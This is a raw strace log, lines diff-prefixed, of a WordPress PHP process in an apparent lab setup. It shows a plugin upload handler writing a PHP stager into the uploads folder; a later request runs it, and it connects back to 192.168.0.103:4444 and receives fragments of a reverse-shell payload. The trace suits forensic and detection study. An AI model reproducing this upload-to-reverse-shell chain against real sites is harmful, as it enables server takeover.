+rt_sigaction(SIGQUIT, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGTERM, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGUSR1, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGUSR2, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+setitimer(ITIMER_PROF, {it_interval={tv_sec=0, tv_usec=0}, it_value={tv_sec=30, tv_usec=0}}, NULL) = 0
+rt_sigaction(SIGPROF, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, NULL, 8) = 0
+rt_sigprocmask(SIG_UNBLOCK, [PROF], NULL, 8) = 0
+getcwd("/var/www/html", 4096)           = 14
+lstat("/tmp", {st_mode=S_IFDIR|S_ISVTX|0777, st_size=4096, ...}) = 0
+getpid()                                = 68
+open("/tmp/phpb8dOW2", O_RDWR|O_CREAT|O_EXCL, 0600) = 11
+write(11, "/*<?php /**/ error_reporting(0);"..., 1114) = 1114
+close(11)                               = 0
+getcwd("/var/www/html", 4095)           = 14
+chdir("/var/www/html/wp-content/plugins/ait-csv-import-export/admin") = 0
+fcntl(8, F_SETLK, {l_type=F_RDLCK, l_whence=SEEK_SET, l_start=1, l_len=1}) = 0
+lstat("/var/www/html/wp-content/plugins/ait-csv-import-export/admin/upload-handler.php", {st_mode=S_IFREG|0644, st_size=2139, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/ait-csv-import-export/admin", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/ait-csv-import-export", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-content/plugins/ait-csv-import-export/admin/upload-handler.php", {st_mode=S_IFREG|0644, st_size=2139, ...}) = 0
+access("/var/www/html/wp-content/plugins/ait-csv-import-export/admin/../../../../wp-load.php", F_OK) = 0
+access("/var/www/html/wp-config.php", F_OK) = 0
+access("/var/www/html/.maintenance", F_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/languages", F_OK) = -1 ENOENT (No such file or directory)
+stat("/var/www/html/wp-includes/languages", 0x7ffd088e3460) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/db.php", F_OK) = -1 ENOENT (No such file or directory)
+stat("/etc/resolv.conf", {st_mode=S_IFREG|0644, st_size=38, ...}) = 0
+open("/etc/hosts", O_RDONLY|O_CLOEXEC)  = 11
+fstat(11, {st_mode=S_IFREG|0644, st_size=174, ...}) = 0
+read(11, "127.0.0.1\tlocalhost\n::1\tlocalhos"..., 4096) = 174
+read(11, "", 4096)                      = 0
+close(11)                               = 0
+stat("/etc/resolv.conf", {st_mode=S_IFREG|0644, st_size=38, ...}) = 0
+socket(AF_INET, SOCK_DGRAM|SOCK_NONBLOCK, IPPROTO_IP) = 11
+connect(11, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, 16) = 0
+poll([{fd=11, events=POLLOUT}], 1, 0)   = 1 ([{fd=11, revents=POLLOUT}])
+sendmmsg(11, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\261\226\1\0\0\1\0\0\0\0\0\0\2db\0\0\1\0\1", iov_len=20}], msg_iovlen=1, msg_controllen=0, msg_flags=MSG_DONTWAIT|MSG_EOR|MSG_WAITALL|MSG_FIN|MSG_SYN|MSG_CONFIRM|MSG_RST|MSG_SENDPAGE_NOTLAST|MSG_BATCH|MSG_NO_SHARED_FRAGS|0x8800000}, msg_len=20}, {msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\361\374\1\0\0\1\0\0\0\0\0\0\2db\0\0\34\0\1", iov_len=20}], msg_iovlen=1, msg_controllen=0, msg_flags=MSG_WAITALL|MSG_FIN|MSG_SYN|MSG_CONFIRM|MSG_ERRQUEUE|MSG_NOSIGNAL|MSG_WAITFORONE|MSG_BATCH|MSG_NO_SHARED_FRAGS|MSG_ZEROCOPY|MSG_CMSG_CLOEXEC|MSG_CMSG_COMPAT|0x8000000}, msg_len=20}], 2, MSG_NOSIGNAL) = 2
+poll([{fd=11, events=POLLIN}], 1, 5000) = 1 ([{fd=11, revents=POLLIN}])
+ioctl(11, FIONREAD, [20])               = 0
+recvfrom(11, "\361\374\201\200\0\1\0\0\0\0\0\0\2db\0\0\34\0\1", 2048, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28->16]) = 20
+poll([{fd=11, events=POLLIN}], 1, 4999) = 1 ([{fd=11, revents=POLLIN}])
+ioctl(11, FIONREAD, [38])               = 0
+recvfrom(11, "\261\226\201\200\0\1\0\1\0\0\0\0\2db\0\0\1\0\1\2db\0\0\1\0\1\0\0\2X"..., 65536, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28->16]) = 38
+close(11)                               = 0
+socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 11
+fcntl(11, F_GETFL)                      = 0x2 (flags O_RDWR)
+fcntl(11, F_SETFL, O_RDWR|O_NONBLOCK)   = 0
+connect(11, {sa_family=AF_INET, sin_port=htons(3306), sin_addr=inet_addr("172.18.0.2")}, 16) = -1 EINPROGRESS (Operation now in progress)
+poll([{fd=11, events=POLLIN|POLLOUT|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLOUT}])
+getsockopt(11, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
+fcntl(11, F_SETFL, O_RDWR)              = 0
+setsockopt(11, SOL_TCP, TCP_NODELAY, [1], 4) = 0
+setsockopt(11, SOL_SOCKET, SO_KEEPALIVE, [1], 4) = 0
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "J\0\0\0", 4, MSG_DONTWAIT, NULL, NULL) = 4
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\n5.7.33\0\r\0\0\0^b\31=S\26lg\0\377\377\10\2\0\377\301\25\0\0\0"..., 78, MSG_DONTWAIT, NULL, NULL) = 74
+sendto(11, "l\0\0\1\215\242\n\0\0\0\0\300\10\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 112, MSG_DONTWAIT, NULL, 0) = 112
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\2", 4, MSG_DONTWAIT, NULL, NULL) = 4
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\0\0\0\2\0\0\0", 78, MSG_DONTWAIT, NULL, NULL) = 7
+sendto(11, "\22\0\0\0\3SET NAMES utf8mb4", 22, MSG_DONTWAIT, NULL, 0) = 22
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\1\0\0\0\2\0\0\0", 71, MSG_DONTWAIT, NULL, NULL) = 11
+getpid()                                = 68
+sendto(11, "5\0\0\0\3SET NAMES 'utf8mb4' COLLATE"..., 57, MSG_DONTWAIT, NULL, 0) = 57
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\1\0\0\0\2\0\0\0", 60, MSG_DONTWAIT, NULL, NULL) = 11
+sendto(11, "\32\0\0\0\3SELECT @@SESSION.sql_mode", 30, MSG_DONTWAIT, NULL, 0) = 30
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\1(\0\0\2\3def\0\0\0\22@@SESSION.sql_m"..., 49, MSG_DONTWAIT, NULL, NULL) = 49
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\5\0\0\3\376\0\0\2\0\212\0\0\4\211ONLY_FULL_GROUP_BY"..., 78, MSG_DONTWAIT, NULL, NULL) = 78
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "ATE,ERROR_FOR_DIVISION_BY_ZERO,N"..., 216, MSG_DONTWAIT, NULL, NULL) = 82
+sendto(11, "m\0\0\0\3SET SESSION sql_mode='NO_ZE"..., 113, MSG_DONTWAIT, NULL, 0) = 113
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\1\0\0\0\2\0\1\0", 134, MSG_DONTWAIT, NULL, NULL) = 11
+sendto(11, "\n\0\0\0\2wordpress", 14, MSG_DONTWAIT, NULL, 0) = 14
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\1\0\0\0\2\0\1\0", 123, MSG_DONTWAIT, NULL, NULL) = 11
+access("/var/www/html/wp-content/object-cache.php", F_OK) = -1 ENOENT (No such file or directory)
+sendto(11, "H\0\0\0\3SELECT option_name, option_"..., 76, MSG_DONTWAIT, NULL, 0) = 76
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\2I\0\0\2\3def\twordpress\nwp_optio"..., 112, MSG_DONTWAIT, NULL, NULL) = 112
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "wp_options\foption_value\foption_v"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "_can_register\0010\34\0\0\n\vadmin_email\17"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "ail.example.com#\0\0\23\20mailserver_l"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "g\0\22\0\0\32\16posts_per_page\00210\23\0\0\33\vdat"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "e\0010\23\0\0#\fblog_charset\5UTF-8j\0\0$\16a"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "nks\00250\16\0\0(\ngmt_offset\2-3\31\0\0)\26def"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "lt_role\nsubscriber\21\0\0001\ndb_versio"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\0\0:\17upload_url_path\0\25\0\0;\20thumbna"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "_default_link_type\4none\24\0\0D\22imag"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "nts_per_page\00250\35\0\0L\25default_comm"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "_multiwidget\";i:1;}5\0\0P\vwidget_t"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "at\0010\27\0\0V\24link_manager_enabled\0010\""..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, ":2:{s:4:\"name\";s:13:\"Administrat"..., 3366, MSG_DONTWAIT, NULL, NULL) = 3366
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, ":\"number\";i:5;}s:12:\"_multiwidge"..., 3366, MSG_DONTWAIT, NULL, NULL) = 3366
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "tly how many clicks your share b"..., 9072, MSG_DONTWAIT, NULL, NULL) = 9072
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "location_post\";a:2:{s:4:\"type\";s"..., 9072, MSG_DONTWAIT, NULL, NULL) = 3387
+access("/var/www/html/wp-includes/Requests/Hooks.php", F_OK) = 0
+access("/var/www/html/wp-includes/Requests/Hooker.php", F_OK) = 0
+mmap(NULL, 2097152, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f85cc85f000
+munmap(0x7f85cc85f000, 2097152)         = 0
+mmap(NULL, 4190208, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f85cc1fb000
+munmap(0x7f85cc1fb000, 20480)           = 0
+munmap(0x7f85cc400000, 2072576)         = 0
+madvise(0x7f85cc200000, 2097152, MADV_HUGEPAGE) = 0
+stat("/var/www/html/wp-content/mu-plugins", 0x7ffd088e3460) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/themes", F_OK) = 0
+access("/var/www/html/wp-content/plugins/social-warfare/social-warfare.php", F_OK) = 0
+access("/var/www/html/wp-content/plugins/wp-rollback/wp-rollback.php", F_OK) = 0
+access("/var/www/html/wp-content/plugins/social-warfare/lib/legacy/update-checker.php", F_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/languages/plugins/social-warfare-en_US.mo", R_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/plugins/social-warfare/languages/social-warfare-en_US.mo", R_OK) = 0
+open("/var/www/html/wp-content/plugins/social-warfare/languages/social-warfare-en_US.mo", O_RDONLY) = 12
+fstat(12, {st_mode=S_IFREG|0644, st_size=5979, ...}) = 0
+lseek(12, 0, SEEK_CUR)                  = 0
+read(12, "\336\22\4\225\0\0\0\0B\0\0\0\34\0\0\0,\2\0\0\0\0\0\0<\4\0\0\0\0\0\0"..., 8192) = 5979
+lseek(12, 28, SEEK_SET)                 = 28
+read(12, "\0\0\0\0<\4\0\0\2\0\0\0=\4\0\0\21\0\0\0@\4\0\0\227\0\0\0R\4\0\0"..., 8192) = 5951
+lseek(12, 1084, SEEK_SET)               = 1084
+read(12, "\0+1\0Above the Content\0Add a desc"..., 8192) = 4895
+read(12, "", 8192)                      = 0
+close(12)                               = 0
+sendto(11, "-\1\0\0\3SELECT   wp_posts.ID FROM w"..., 305, MSG_DONTWAIT, NULL, 0) = 305
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\0013\0\0\2\3def\twordpress\10wp_posts"..., 5685, MSG_DONTWAIT, NULL, NULL) = 78
+access("/var/www/html/wp-content/languages/en_US.mo", R_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/languages/en_US.php", R_OK) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/languages", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/themes/twentyseventeen/functions.php", F_OK) = 0
+access("/var/www/html/wp-content/languages/themes/twentyseventeen-en_US.mo", R_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/themes/twentyseventeen/en_US.mo", R_OK) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/languages/plugins", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/languages/themes", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = -1 ENOENT (No such file or directory)
+sendto(11, "Q\0\0\0\3SELECT option_value FROM wp"..., 85, MSG_DONTWAIT, NULL, 0) = 85
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\1K\0\0\2\3def\twordpress\nwp_optio"..., 5607, MSG_DONTWAIT, NULL, NULL) = 102
+access("/var/www/html/wp-content/uploads/2021/04", F_OK) = 0
+stat("/var/www/html/wp-content/uploads/2021/04", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+rename("/tmp/phpb8dOW2", "/var/www/html/wp-content/uploads/SzJk9C.php") = -1 EXDEV (Invalid cross-device link)
+stat("/tmp/phpb8dOW2", {st_mode=S_IFREG|0600, st_size=1114, ...}) = 0
+stat("/var/www/html/wp-content/uploads/SzJk9C.php", 0x7ffd088e3480) = -1 ENOENT (No such file or directory)
+lstat("/tmp/phpb8dOW2", {st_mode=S_IFREG|0600, st_size=1114, ...}) = 0
+open("/tmp/phpb8dOW2", O_RDONLY)        = 12
+fstat(12, {st_mode=S_IFREG|0600, st_size=1114, ...}) = 0
+lseek(12, 0, SEEK_CUR)                  = 0
+lstat("/var/www/html/wp-content/uploads/SzJk9C.php", 0x7ffd088e0120) = -1 ENOENT (No such file or directory)
+lstat("/var/www/html/wp-content/uploads", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+open("/var/www/html/wp-content/uploads/SzJk9C.php", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 13
+fstat(13, {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
+lseek(13, 0, SEEK_CUR)                  = 0
+fstat(12, {st_mode=S_IFREG|0600, st_size=1114, ...}) = 0
+fstat(12, {st_mode=S_IFREG|0600, st_size=1114, ...}) = 0
+mmap(NULL, 1114, PROT_READ, MAP_SHARED, 12, 0) = 0x7f85e3e19000
+write(13, "/*<?php /**/ error_reporting(0);"..., 1114) = 1114
+lseek(12, 1114, SEEK_SET)               = 1114
+munmap(0x7f85e3e19000, 1114)            = 0
+close(12)                               = 0
+close(13)                               = 0
+unlink("/tmp/phpb8dOW2")                = 0
+lstat("/var/www/html/wp-content/uploads/SzJk9C.php", {st_mode=S_IFREG|0644, st_size=1114, ...}) = 0
+open("/var/www/html/wp-content/uploads/SzJk9C.php", O_RDONLY) = 12
+fstat(12, {st_mode=S_IFREG|0644, st_size=1114, ...}) = 0
+lseek(12, 0, SEEK_CUR)                  = 0
+read(12, "/*<?php /**/ error_reporting(0);"..., 8192) = 1114
+read(12, "", 8192)                      = 0
+chdir("/var/www/html")                  = 0
+setitimer(ITIMER_PROF, {it_interval={tv_sec=0, tv_usec=0}, it_value={tv_sec=0, tv_usec=0}}, NULL) = 0
+close(12)                               = 0
+sendto(11, "\1\0\0\0\1", 5, MSG_DONTWAIT, NULL, 0) = 5
+close(11)                               = 0
+fcntl(8, F_SETLK, {l_type=F_UNLCK, l_whence=SEEK_SET, l_start=0, l_len=0}) = 0
+munmap(0x7f85cc200000, 2097152)         = 0
+setitimer(ITIMER_PROF, {it_interval={tv_sec=0, tv_usec=0}, it_value={tv_sec=0, tv_usec=0}}, NULL) = 0
+writev(10, [{iov_base="HTTP/1.0 200 OK\r\nDate: Tue, 20 A"..., iov_len=184}, {iov_base="{\"result\":false,\"report\":{\"type\""..., iov_len=84}], 2) = 268
+write(7, "192.168.0.103 - - [20/Apr/2021:0"..., 195) = 195
+times({tms_utime=53, tms_stime=10, tms_cutime=0, tms_cstime=0}) = 1431994719
+shutdown(10, SHUT_WR)                   = 0
+poll([{fd=10, events=POLLIN}], 1, 2000) = 1 ([{fd=10, revents=POLLIN|POLLHUP}])
+read(10, "", 512)                       = 0
+close(10)                               = 0
+read(4, 0x7ffd088e5d9f, 1)              = -1 EAGAIN (Resource temporarily unavailable)
+accept4(3, {sa_family=AF_INET, sin_port=htons(37873), sin_addr=inet_addr("192.168.0.103")}, [128->16], SOCK_CLOEXEC) = 10
+getsockname(10, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("172.18.0.3")}, [128->16]) = 0
+fcntl(10, F_GETFL)                      = 0x2 (flags O_RDWR)
+fcntl(10, F_SETFL, O_RDWR|O_NONBLOCK)   = 0
+read(10, "GET /wp-content/uploads/SzJk9C.p"..., 8000) = 137
+stat("/var/www/html/wp-content/uploads/SzJk9C.php", {st_mode=S_IFREG|0644, st_size=1114, ...}) = 0
+open("/var/www/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/.htaccess", O_RDONLY|O_CLOEXEC) = 11
+fstat(11, {st_mode=S_IFREG|0644, st_size=35, ...}) = 0
+read(11, "# BEGIN WordPress\n\n# END WordPre"..., 4096) = 35
+read(11, "", 4096)                      = 0
+close(11)                               = 0
+open("/var/www/html/wp-content/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/uploads/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/uploads/SzJk9C.php/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOTDIR (Not a directory)
+rt_sigaction(SIGPROF, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGHUP, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGINT, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGQUIT, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGTERM, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGUSR1, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGUSR2, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+setitimer(ITIMER_PROF, {it_interval={tv_sec=0, tv_usec=0}, it_value={tv_sec=30, tv_usec=0}}, NULL) = 0
+rt_sigaction(SIGPROF, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, NULL, 8) = 0
+rt_sigprocmask(SIG_UNBLOCK, [PROF], NULL, 8) = 0
+getcwd("/var/www/html", 4095)           = 14
+chdir("/var/www/html/wp-content/uploads") = 0
+open("/var/www/html/wp-content/uploads/SzJk9C.php", O_RDONLY) = 11
+fstat(11, {st_mode=S_IFREG|0644, st_size=1114, ...}) = 0
+fstat(11, {st_mode=S_IFREG|0644, st_size=1114, ...}) = 0
+fstat(11, {st_mode=S_IFREG|0644, st_size=1114, ...}) = 0
+mmap(NULL, 1114, PROT_READ, MAP_SHARED, 11, 0) = 0x7f85e3e19000
+fcntl(8, F_SETLK, {l_type=F_RDLCK, l_whence=SEEK_SET, l_start=1, l_len=1}) = 0
+stat("/var/www/html/wp-content/uploads/SzJk9C.php", {st_mode=S_IFREG|0644, st_size=1114, ...}) = 0
+munmap(0x7f85e3e19000, 1114)            = 0
+close(11)                               = 0
+socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 11
+fcntl(11, F_GETFL)                      = 0x2 (flags O_RDWR)
+fcntl(11, F_SETFL, O_RDWR|O_NONBLOCK)   = 0
+connect(11, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.0.103")}, 16) = -1 EINPROGRESS (Operation now in progress)
+poll([{fd=11, events=POLLIN|POLLOUT|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLOUT}])
+getsockopt(11, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
+fcntl(11, F_SETFL, O_RDWR)              = 0
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\0\0\231r/*<?php /**/\n\n\n\n\n\nif (!isset"..., 8192, MSG_DONTWAIT, NULL, NULL) = 1452
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "f ($f) {\n      do { $contents .="..., 8192, MSG_DONTWAIT, NULL, NULL) = 5792
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "q, $pkt);\n    } else {\n      my_"..., 8192, MSG_DONTWAIT, NULL, NULL) = 5792
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "NUMEXTCMD);\n  function core_enum"..., 8192, MSG_DONTWAIT, NULL, NULL) = 1448
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "), 64, \"\\n\");\n   $pem = \"-----BE"..., 8192, MSG_DONTWAIT, NULL, NULL) = 1448
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "kt, create_tlv(TLV_TYPE_SESSION_"..., 8192, MSG_DONTWAIT, NULL, NULL) = 2896
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "$bytes_needed = $len - strlen($r"..., 8192, MSG_DONTWAIT, NULL, NULL) = 4344
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "eturn $pkt;\n}\n\nfunction create_r"..., 8192, MSG_DONTWAIT, NULL, NULL) = 5792
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
